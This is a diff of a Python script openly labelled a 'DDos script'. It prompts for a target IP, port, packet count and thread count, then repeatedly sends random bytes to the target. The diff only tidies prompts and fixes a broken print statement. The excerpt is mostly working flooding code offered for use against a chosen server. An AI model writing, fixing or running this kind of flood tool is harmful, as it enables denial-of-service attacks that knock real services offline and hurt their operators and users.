@@ -26,7 +26,7 @@ print("=🅳🅴🅳🅲🅾🅳🅴 🆃🅴🅰🅼=")
 print("=DDos script=")
 ip = str(input(" IP ════> "))
 port = int(input(" Port ════> "))
-choice = str(input(" Lanjut gak ?(y/n) ════> "))
+choice = str(input(" Lanjut gak?(y/n) ════> "))
 times = int(input(" Packets time ════> "))
 threads = int(input(" Потоки (~800 лучше) ════> "))
 
@@ -53,9 +53,9 @@ def run():
       addr = (str(ip),int(port))
       for x in range(times):
         s.sendto(data,addr)
-      print(i + green + f"|###[Ddos Attack] GO [Server]###|")
+      print(i + "|###[Ddos Attack] GO [Server]###|")
     except:
-      print([!] red + f"|###[Ddos Attack] GO [Server]###|")
+      print("[!] |###[Ddos Attack] GO [Server]###|")
 
 def run2():
   data = random._urandom(16)
